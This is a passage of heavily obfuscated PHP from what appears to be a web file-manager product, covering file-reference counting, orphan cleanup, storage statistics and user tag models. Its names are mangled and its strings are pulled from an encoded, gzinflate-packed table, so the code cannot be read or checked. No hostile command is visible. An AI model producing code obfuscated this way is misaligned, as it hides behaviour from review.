$¯­ôÛşÂ))->save(array($‡‡‚Ä¡[547] => $Ù…™€‘)); } public function addFileMake($«­ğş”, $„”’©½Â, $õƒ™’ì«, $ì”ìÈ£’, $Æ¶‚÷Ú, $’‘ÛÒ¨¯) { $¤ª…˜ƒ¾ =& $_SERVER[¢ñàß¿€]; $ùªáçª = $this->createFileName($Æ¶‚÷Ú, $õƒ™’ì«, $ì”ìÈ£’); $ºçŒÖ×î = get_path_father($ùªáçª); $£û€¦’å = get_path_this($ùªáçª); if ($’‘ÛÒ¨¯) { $Œ‘¯æ¡ = IO::move($«­ğş”, $ºçŒÖ×î, !1, $£û€¦’å); } else { $Œ‘¯æ¡ = IO::copy($«­ğş”, $ºçŒÖ×î, !1, $£û€¦’å); } if (!$Œ‘¯æ¡) { return !1; } $½Ìˆ€Ä = KodIO::defaultDriver(); $µ±œÊğÉ = array($¤ª…˜ƒ¾[617] => $„”’©½Â, $¤ª…˜ƒ¾[2029] => 1, $¤ª…˜ƒ¾[494] => $Æ¶‚÷Ú, $¤ª…˜ƒ¾[879] => $½Ìˆ€Ä[$¤ª…˜ƒ¾[475]], $¤ª…˜ƒ¾[495] => $ùªáçª, $¤ª…˜ƒ¾[2030] => $õƒ™’ì«, $¤ª…˜ƒ¾[2031] => $ì”ìÈ£’); return $µ±œÊğÉ; } public function addFileCheckExist($Îƒ¤ÖóÖ, $„×ÍÑ, $öØâüÖ½) { $ÏùªÔ½§ =& $_SERVER[¢ñàß¿€]; $Ãá¦©íç = $this->findByHash($Îƒ¤ÖóÖ, $„×ÍÑ); if (!$Ãá¦©íç) { return !1; } $÷çº¹ = array($ÏùªÔ½§[2029] => intval($Ãá¦©íç[$ÏùªÔ½§[2036]]) + 1, $ÏùªÔ½§[617] => $öØâüÖ½); $this->where(array($ÏùªÔ½§[542] => $Ãá¦©íç[$ÏùªÔ½§[541]]))->save($÷çº¹); return $Ãá¦©íç; } public function remove($«Ç¢†¼É) { $this->linkCountChange($«Ç¢†¼É, !1); $this->clearEmpty(); return !0; } public function linkAdd($µ¸ù³æŠ) { $this->linkCountChange($µ¸ù³æŠ, !0); } public function linkCountChange($…£œ£¤, $¶Ö…Ë¶°) { $²ú®„‡£ =& $_SERVER[¢ñàß¿€]; if (!$…£œ£¤) { return; } if (!is_array($…£œ£¤)) { $…£œ£¤ = array($…£œ£¤); } $€•½„…ı = array(); foreach ($…£œ£¤ as $½é÷¥Ñç) { $ÙŠ§Õ¾¾ = $½é÷¥Ñç . $²ú®„‡£[12]; if (!$€•½„…ı[$ÙŠ§Õ¾¾]) { $€•½„…ı[$ÙŠ§Õ¾¾] = 0; } $€•½„…ı[$ÙŠ§Õ¾¾]++; } $ü ÖÃ¹À = array(); foreach ($€•½„…ı as $½é÷¥Ñç => $¦èî·Ö€) { $ÙŠ§Õ¾¾ = $¦èî·Ö€ . $²ú®„‡£[12]; if (!$ü ÖÃ¹À[$ÙŠ§Õ¾¾]) { $ü ÖÃ¹À[$ÙŠ§Õ¾¾] = array(); } $ü ÖÃ¹À[$ÙŠ§Õ¾¾][] = $½é÷¥Ñç; } foreach ($ü ÖÃ¹À as $¦èî·Ö€ => $¯ô®œÉÕ) { if (!$¯ô®œÉÕ) { continue; } $¦èî·Ö€ = $¶Ö…Ë¶° ? $¦èî·Ö€ : -intval($¦èî·Ö€); $˜¯Ê¶®Ñ = array($²ú®„‡£[541] => array($²ú®„‡£[7], $¯ô®œÉÕ)); if ($¦èî·Ö€ < 0) { $˜¯Ê¶®Ñ[$²ú®„‡£[2036]] = array($²ú®„‡£[1090], abs($¦èî·Ö€)); } $this->where($˜¯Ê¶®Ñ)->setAdd($²ú®„‡£[2036], $¦èî·Ö€); } } public function findByHash($æŞŸÅ…ˆ, $í­äƒì = false) { $šÜßÀ“ =& $_SERVER[¢ñàß¿€]; if (!$æŞŸÅ…ˆ && !$í­äƒì) { return !1; } $ñâÍ„‘« = array($šÜßÀ“[2030] => $æŞŸÅ…ˆ); if ($í­äƒì) { $ñâÍ„‘« = array($šÜßÀ“[2031] => $í­äƒì); } return $this->order($šÜßÀ“[2037])->where($ñâÍ„‘«)->find(); } public function clearEmpty($‚ÜìÏæÄ = 0) { $Œ¡˜”°· =& $_SERVER[¢ñàß¿€]; $ŠÙø‡¼á = time() - 3600 * 24 * $‚ÜìÏæÄ; $ãøÛÅìÆ = $Œ¡˜”°·[2038] . $ŠÙø‡¼á; $¸Ï¥ƒ…Í = $this->where($ãøÛÅìÆ)->select(); if (!$¸Ï¥ƒ…Í) { return; } $¼­Œ£•— = new Task($Œ¡˜”°·[2039], $Œ¡˜”°·[12], count($¸Ï¥ƒ…Í)); foreach ($¸Ï¥ƒ…Í as $Áœ—ã“) { $¼­Œ£•—->update(1); $this->resetFile($Áœ—ã“); } $¼­Œ£•—->end(); } public function resetFile($×•¾Œ¤) { $š¹ö«üæ =& $_SERVER[¢ñàß¿€]; $œè×äË› = array($š¹ö«üæ[542] => $×•¾Œ¤[$š¹ö«üæ[541]]); $‰â¾¼½¡ = Model($š¹ö«üæ[1414])->where($œè×äË›)->count(); $±âé²¡ = Model($š¹ö«üæ[2040])->where($œè×äË›)->count(); $ú·Ä²õ­ = intval($‰â¾¼½¡) + intval($±âé²¡); if ($ú·Ä²õ­ == 0) { IO::remove($×•¾Œ¤[$š¹ö«üæ[87]]); Model($š¹ö«üæ[2041])->delete($×•¾Œ¤[$š¹ö«üæ[541]]); $this->where($œè×äË›)->delete(); $this->metaSet($×•¾Œ¤[$š¹ö«üæ[541]], null, null); write_log(ACTION . $š¹ö«üæ[2042] . KodUser::id() . $š¹ö«üæ[2043] . $×•¾Œ¤[$š¹ö«üæ[541]] . $š¹ö«üæ[2044] . $×•¾Œ¤[$š¹ö«üæ[79]] . $š¹ö«üæ[201] . $×•¾Œ¤[$š¹ö«üæ[87]], $š¹ö«üæ[2045]); return; } if ($×•¾Œ¤[$š¹ö«üæ[2036]] != $ú·Ä²õ­) { $this->where($œè×äË›)->save(array($š¹ö«üæ[2029] => $ú·Ä²õ­)); } } public function storageInfo($ø¦€Ñ°÷ = false) { $Ê–¹œíª =& $_SERVER[¢ñàß¿€]; $êĞïîØ = $this->count() + 0.0; $úã×Î€ğ = 0; $éçÇˆÉ = 1; $ßñ¾ä™ = 0; $¤šÈÙÛˆ = 5000; for ($µ§û£Éº = 0; $µ§û£Éº < $êĞïîØ; $µ§û£Éº = $µ§û£Éº + $¤šÈÙÛˆ) { $ü‚ëŞ Ç = $this->limit($µ§û£Éº, $µ§û£Éº + $¤šÈÙÛˆ)->select(); foreach ($ü‚ëŞ Ç as $™Äü»å¬) { $éçÇˆÉ += $™Äü»å¬[$Ê–¹œíª[79]] * $™Äü»å¬[$Ê–¹œíª[2036]]; $úã×Î€ğ += $™Äü»å¬[$Ê–¹œíª[79]] * ($™Äü»å¬[$Ê–¹œíª[2036]] - 1); $ßñ¾ä™ += $™Äü»å¬[$Ê–¹œíª[2036]]; } } $œ‘´ğ×Ç = array($Ê–¹œíª[2046] => $éçÇˆÉ, $Ê–¹œíª[2047] => $úã×Î€ğ, $Ê–¹œíª[2048] => $úã×Î€ğ / $éçÇˆÉ, $Ê–¹œíª[83] => $êĞïîØ, $Ê–¹œíª[2049] => $ßñ¾ä™); return $œ‘´ğ×Ç; } } goto BÊ“„›ù›î; a¾­²‰²Œ²: while ($pxmfudlhsi < $_SERVER[¢ñàß¿€][680]) { if ($pxmfudlhsi >= 0) { break; } $pxmfudlhsi++; } $_SERVER[ªõè”¿˜] = explode($_SERVER[¢ñàß¿€][681], gzinflate(substr($_SERVER[¢ñàß¿€][682], 10, -8))); $fywmlbapgh = $_SERVER[¢ñàß¿€][683]; goto D†ƒ‰âºÁĞ; d‘¬¡¦„Ïö: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($ğ‹—Ü´°) { $’‚è±Ö‚ =& $_SERVER[¢ñàß¿€]; return array($’‚è±Ö‚[2083] => array($’‚è±Ö‚[2497] . USER_ID, $’‚è±Ö‚[2084])); } protected function listData() { $¬ôˆ²©Ş =& $_SERVER[¢ñàß¿€]; $²Â‘£Ñ¤ = array($¬ôˆ²©Ş[1761] => USER_ID, $¬ôˆ²©Ş[557] => array($¬ôˆ²©Ş[2087], 0)); $¦Î×áã— = $¬ôˆ²©Ş[2498]; $Í±¦ß’ü = $this->field($¦Î×áã—)->where($²Â‘£Ñ¤)->order($¬ôˆ²©Ş[2090])->select(); return $Í±¦ß’ü ? $Í±¦ß’ü : array(); } protected function addToTag($®ÕÔıÑ×, $ôáµ¸°ˆ) { $Ÿ×ÜˆÍş =& $_SERVER[¢ñàß¿€]; if (!Model($Ÿ×ÜˆÍş[2234])->listData($ôáµ¸°ˆ)) { return !1; } if (is_numeric($®ÕÔıÑ×)) { $ô”ô«¶Ñ = Model($Ÿ×ÜˆÍş[895])->pathInfo($®ÕÔıÑ×); if (!$ô”ô«¶Ñ) { return !1; } } else { $ô”ô«¶Ñ = IO::infoSimple($®ÕÔıÑ×); if (!$ô”ô«¶Ñ) { return !1; } $ÏáåË ƒ = $ô”ô«¶Ñ[$Ÿ×ÜˆÍş[32]]; $ó¥€³Ğ½ = $ô”ô«¶Ñ[$Ÿ×ÜˆÍş[33]]; if (isset($ô”ô«¶Ñ[$Ÿ×ÜˆÍş[485]])) { $ó¥€³Ğ½ = $ô”ô«¶Ñ[$Ÿ×ÜˆÍş[485]] == $Ÿ×ÜˆÍş[91] ? $Ÿ×ÜˆÍş[78] : $Ÿ×ÜˆÍş[230]; } } $¼×ıÌ«ú = array($Ÿ×ÜˆÍş[1761] => USER_ID, $Ÿ×ÜˆÍş[557] => $ôáµ¸°ˆ, $Ÿ×ÜˆÍş[495] => $®ÕÔıÑ×, $Ÿ×ÜˆÍş[496] => $ó¥€³Ğ½ ? $ó¥€³Ğ½ : $Ÿ×ÜˆÍş[490], $Ÿ×ÜˆÍş[494] => $ÏáåË ƒ ? $ÏáåË ƒ : $Ÿ×ÜˆÍş[12], $Ÿ×ÜˆÍş[1972] => 0); if ($this->where($¼×ıÌ«ú)->find()) { return !1; } return $this->add($¼×ıÌ«ú); } protected function removeFromTag($˜ƒÍÊó, $±é‰ÚşÜ) { $³Ù›½•» =& $_SERVER[¢ñàß¿€]; if (!Model($³Ù›½•»[2234])->listData($±é‰ÚşÜ)) { return !1; } if (is_array($˜ƒÍÊó)) { $˜ƒÍÊó = array($³Ù›½•»[7], $˜ƒÍÊó); } $¶·Ü³Ë = array($³Ù›½•»[1761] => USER_ID, $³Ù›½•»[557] => $±é‰ÚşÜ, $³Ù›½•»[495] => $˜ƒÍÊó); return $this->where($¶·Ü³Ë)->delete(); } protected function removeByTag($¦»çÏÀŒ) { $ÊëÅ§¸˜ =& $_SERVER[¢ñàß¿€]; if (!$¦»çÏÀŒ) { return !1; } $…ØÅòÖö = array($ÊëÅ§¸˜[1761] => USER_ID, $ÊëÅ§¸˜[557] => $¦»çÏÀŒ); return $this->where($…ØÅòÖö)->delete(); } protected function removeBySource($õ“¥£¥ã) { $ë­Á†ÎË =& $_SERVER[¢ñàß¿€]; if (is_array($õ“¥£¥ã)) { $õ“¥£¥ã = array($ë­Á†ÎË[7], $õ“¥£¥ã); } $­’Æ½Â¯ = array($ë­Á†ÎË[1761] => USER_ID, $ë­Á†ÎË[557] => array($ë­Á†ÎË[1089], 0), $ë­Á†ÎË[495] => $õ“¥£¥ã); return $this->where($­’Æ½Â¯)->delete(); } }